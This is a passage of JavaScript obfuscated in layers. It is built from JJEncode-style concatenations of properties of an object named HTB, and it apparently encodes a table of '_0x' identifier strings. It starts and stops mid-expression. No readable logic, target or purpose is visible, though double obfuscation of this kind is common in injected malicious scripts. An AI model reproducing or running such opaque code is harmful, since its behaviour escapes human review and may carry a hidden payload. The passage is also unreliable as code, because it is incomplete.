B._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$__+HTB.$$_+HTB.$$_+HTB.$_$+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._+HTB.$$__+HTB.__+HTB._$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$__+HTB.__$+HTB.$$$$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$$$$+HTB.$$$$+HTB.$__$+HTB._$$+"|\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+HTB.$___+HTB._$$+HTB.___+HTB.$$_$+"|\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$___+HTB._$$+HTB._$_+HTB._$_+HTB.$__+"|"+HTB.$$$+HTB.$$$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.$$$_+HTB.$$$_+HTB.$$$_+HTB._$_+HTB.$$$$+HTB._$_+HTB.$$_$+HTB.$$__+HTB.__$+HTB.$$_+HTB._$_+HTB.$$__+HTB.$$__+HTB.$___+HTB.$_$+HTB._$$+HTB.$_$_+HTB.$___+HTB._$$+HTB.$$$+HTB.__$+HTB._$$+HTB.$__$+HTB.$_$+HTB.$$_$+HTB.$$_$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+HTB.$__$+HTB._$$+HTB.$$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.__$+HTB.$$$+HTB.$__$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+HTB.__+HTB._$+HTB.__+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$$_+"|\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$_+HTB.$$__+HTB.$__$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_$+HTB.$$_+HTB.$_$+HTB._$_+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$$$+HTB.$_$+HTB.$$$$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB._$$+HTB.$$$_+HTB._$$+HTB.$$_$+"|\\"+HTB.__$+HTB.$$_+HTB.___+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_$+HTB.$$$_+HTB.$$$_+HTB.$$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$___+HTB.$_$$+HTB.$_$+HTB.$$$_+HTB.$$$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_$+HTB.$$_$+HTB.$$$$+HTB.$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.___+HTB.$$_$+HTB.$_$$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$_+HTB.$__+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB._$_+"|\\"+HTB.__$+HTB.__$+HTB.$_$+HTB.$_$_+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.__$+HTB.$_$_+HTB.$___+HTB.$_$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$_$+HTB.___+HTB.$_$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB.__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB._$_+HTB.$___+HTB._$_+HTB.$__+"|"+HTB.$_$$+"|\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"|"+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.___+HTB.$_$+HTB.$__+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$_+HTB._$$+HTB.$___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$_$$+HTB.$$_+HTB.$$$$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$___+HTB.$_$_+HTB._$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.__$+HTB.___+HTB.$$_$+HTB.$$$$+"|"+HTB._$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB._$_+HTB.$_$+HTB.$__+HTB.$___+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.__$+HTB.$$$+HTB.$_$+HTB.$$__+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$$$+HTB.$__$+HTB.$_$_+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB._$$+HTB.$$_$+HTB.$_$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+HTB.$__$+HTB.__$+HTB.$_$_+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+HTB._+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$__$+HTB.__$+HTB.$$_$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB.$_$$+HTB.$$__+HTB.$$$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$__+HTB.$__+HTB.$__$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$___+HTB.$$_$+HTB.$__$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB.$$_+HTB.$$_+HTB.$__$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$__$+HTB.$_$+HTB.$$$$+HTB.$_$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.__$+HTB._$_+HTB.$_$_+HTB.$__+"|"+HTB.$$__+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$_+HTB.$_$+HTB.$_$+HTB.$_$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB._$$+HTB.$$$_+HTB.$$__+"|"+HTB.$$__+HTB.$$$+HTB.___+HTB.$$$$+HTB._$_+HTB.$$_$+HTB.$$$_+HTB.__$+HTB.$_$+HTB._$_+HTB.__$+HTB.$$_+HTB.$$__+HTB.$__$+HTB.$__+HTB.__$+HTB.$$__+HTB._$$+HTB.$$_+HTB.$_$_+HTB.$$_+HTB.$_$_+HTB._$$+HTB.$$$+HTB.$$$+HTB.$_$_+HTB.$$$+HTB.$___+HTB.$$$$+HTB._$_+HTB.$__+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$$+HTB.$__+HTB.__$+HTB.$$$_+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$$+HTB.$$$+HTB.$$_$+HTB.$$$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+HTB.$$__+HTB._$_+HTB.$_$$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$___+HTB._$$+HTB.$_$$+HTB.$$_$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$_$+HTB.$_$+HTB.__$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.$$__+HTB.$$_$+HTB.$_$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$$+HTB.$$__+HTB.$$$$+HTB.$$$$+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$$+HTB.$$_$+HTB.$___+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.___+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.__$+HTB.$$__+HTB._$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$__+HTB.$$$+HTB._$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+HTB.$$$$+HTB.$$_+HTB._$_+HTB._$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB._$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$_+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$__$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+HTB.$$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB._$_+HTB.$__$+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB.$$_+HTB.__$+HTB.$__+HTB.$__+"|\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"|"+HTB.$_$_+HTB.$$$_+HTB._$$+HTB.$$$_+HTB._$$+HTB.$$_$+HTB.$$_$+HTB.$$$+HTB.$___+HTB.$__+HTB._$$+HTB.$___+HTB.$$_+HTB._$_+HTB.$$_+HTB.$$_$+HTB.$__+HTB._$$+HTB.$$__+HTB.$_$_+HTB.$$$_+HTB.$$$$+HTB.$__+HTB.$$_+HTB.__$+HTB.$$_$+HTB.$___+HTB._$$+HTB.$$$+HTB.$$_$+HTB.$$$$+HTB.$__+"|"+HTB.$$_$+HTB.$$$_+HTB.$$__+HTB._$+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$_$+HTB.$__$+HTB.$$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.___+HTB.__+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.__$+HTB.$$_$+HTB.$$_+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$__+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.$$_$+HTB.$_$+HTB.$$$+HTB.$_$_+HTB.$$_$+HTB.___+HTB.$__$+HTB.$_$$+HTB.$$_$+HTB.___+HTB._$_+HTB.___+HTB.$___+HTB.$_$+HTB.___+HTB.__$+HTB.$$$_+HTB._$_+HTB.$___+HTB.___+HTB.$___+HTB.$_$_+HTB.$$$$+HTB.$_$_+HTB.$$_+HTB.$__+HTB.$$$_+HTB.$_$+HTB.$_$+HTB.$_$_+HTB.$$$$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.__$+HTB.$_$$+HTB.$_$+HTB.$$_+HTB.$_$_+"|"+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+HTB.$$_$+HTB.$__$+HTB.$___+HTB.$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$_$+"|"+HTB.$$$$+HTB.$__$+HTB.___+HTB.$$_+HTB.__$+HTB.$$$$+HTB.$$$+HTB.$$__+HTB.___+HTB.$$$$+HTB.$$$_+HTB.$$$+HTB._$$+HTB.$$__+HTB.___+HTB.$$$$+HTB.___+HTB.$_$_+HTB.$__$+HTB.$$_$+HTB._$$+HTB.__$+HTB.___+HTB._$_+HTB.$_$+HTB.__$+HTB.$_$_+HTB.___+HTB.$$$$+HTB._$$+HTB.$_$$+HTB._$_+"|"+HTB.$$$$+HTB.$__+HTB.$$_$+HTB.$$$$+HTB._$_+HTB.__$+HTB.$$__+HTB.$$__+HTB.$$__+HTB.$_$_+HTB.___+HTB.$$$+HTB._$_+HTB.$_$$+HTB.$_$_+HTB.$_$+HTB.$$$_+HTB.___+HTB.___+HTB._$$+HTB.$$$_+HTB._$_+HTB.$$_+HTB.$_$+HTB.$$$_+HTB.$__+HTB._$$+HTB.__$+HTB.$__+HTB.$_$_+HTB.$_$_+HTB.$__+"|"+HTB.$_$_+HTB.$__+HTB.$_$_+HTB.$__$+HTB._$_+HTB.$$_+HTB.$$$+HTB.___+HTB.___+HTB.$$_$+HTB.$$$_+HTB.$__$+HTB.___+HTB.$$$+HTB.$_$+HTB.___+HTB.$$$$+HTB._$$+HTB.$___+HTB.$$_$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$__+HTB.$__+HTB.$_$$+HTB.$$$$+HTB.___+HTB.$$_$+HTB.$$_+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$__$+HTB.$_$$+HTB.$$$_+HTB._$_+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$$_$+HTB.__$+HTB.$$$_+HTB.___+HTB.$$__+HTB.$_$$+HTB.___+HTB.$___+HTB.$_$_+HTB.$__$+HTB.___+HTB.$__$+HTB.$$_+HTB.$_$+HTB.$_$_+HTB.$$$+HTB.$__+HTB.$___+HTB.$__$+HTB.$_$_+HTB.$_$_+HTB.$_$$+HTB.$$__+HTB.$_$+HTB.$$$$+HTB.$$_+HTB.$$_$+HTB.$__+HTB._$_+HTB._$$+HTB.$$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$$_$+HTB.$_$$+HTB.$$$_+HTB.$__+"|\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.$$__+HTB._$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$_+HTB.___+HTB.$$__+HTB.$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+HTB.$$$+HTB.$$$$+HTB.$_$$+HTB._$_+"|"+HTB.$$$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$_$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$_+HTB.$__$+HTB.$_$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+HTB.$__+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$___+HTB.$$$$+HTB.$$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$$$_+HTB.$$$_+HTB.$$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$_$$+HTB.$$$$+HTB.$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB.$$$$+HTB.___+HTB.$$$_+HTB.$_$$+"|\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$_+"|"+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.$_$+HTB.$__$+"|"+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$___+HTB.$__+HTB.___+HTB.$_$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+"|\\"+HTB.__$+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+HTB.$$_+HTB.$$__+HTB.$__+HTB.$$$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$$$+HTB.$_$$+HTB.$_$$+HTB.$_$+"|"+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$_$+HTB.$_$_+HTB.__+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$__+HTB.$_$+HTB.$$__+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+HTB.$$__+"|"+HTB.__$+HTB._$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$___+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$_+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.$_$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$__+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.$$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$__$+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB.$__$+"|"+HTB.___+"\\"+